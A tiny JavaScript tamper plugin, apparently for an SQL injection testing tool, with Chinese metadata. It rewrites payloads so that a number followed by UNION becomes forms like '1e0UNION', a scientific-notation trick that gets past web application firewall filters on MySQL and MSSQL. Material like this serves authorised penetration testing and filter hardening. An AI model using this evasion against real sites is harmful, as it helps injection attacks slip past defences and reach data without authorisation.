//@name: 数字e0接UNION
//@usage: payload
//@enable: false
//@description: 数字+e0接UNION（1e0UNION，MySQL/MSSQL科学计数绕过）
function tamper(payload){ return payload ? payload.replace(/(\d+)\s+(UNION )/gi, '$1e0$2') : payload; }